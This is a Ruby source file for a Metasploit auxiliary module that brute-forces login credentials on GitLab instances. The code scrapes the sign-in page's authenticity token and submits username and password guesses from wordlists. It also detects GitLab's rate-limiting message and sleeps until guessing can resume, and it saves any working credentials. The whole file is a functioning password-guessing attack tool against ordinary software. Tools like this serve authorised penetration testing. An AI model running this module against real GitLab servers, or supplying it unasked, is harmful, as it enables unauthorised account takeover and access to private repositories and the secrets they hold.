##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class GitLab < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'uri' => uri + '/users/sign_in'
            })

            res = cli.send_recv(req)

            cookie = res.get_cookies

            token = $1 if res and res.body =~ /type="hidden" name="authenticity_token" value="(.*?)" \/><div class="devise-errors">/
            return unless token

            req = cli.request_cgi({
              'uri' => uri + '/users/sign_in',
              'method' => 'POST',
              'vars_post' => {
                'utf8' => "\xe2\x9c\x93",
                'authenticity_token' => token,
                'user[login]' => credential.public,
                'user[password]' => credential.private,
                'user[remember_me]' => 0
              },
              'cookie' => cookie
            })

            res = cli.send_recv(req)
            if res and res.body =~ /Retry later\n/
              while res and res.body =~ /Retry later\n/
                sleep 10
                res = cli.send_recv(req)
              end
            end

            if res and res.body =~ /<title>Sign in \xC2\xB7 GitLab<\/title>/
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            elsif res and res.code == 302
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end
          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'GitLab Credential Bruteforcer',
        'Description'    => %q(
        This module attempts to bruteforce weak credentials on a GitLab instance.

        GitLab is a popular open-source version control management system, with
        similar features to GitHub. Access to GitLab may provide useful sensitive
        information or even credentials. By default, GitLab has rate limiting enabled
        on the authentication mechanism. This module attempts to detect when rate limiting
        is occuring, and sleep while no credentials can be guessed. Tested against 9.0.5.

        Categories: Open Source

        Price: 2

        Video: none

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
      ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 443,
            'SSL' => true,
            'STOP_ON_SUCCESS' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::GitLab.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: datastore['TARGETURI'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
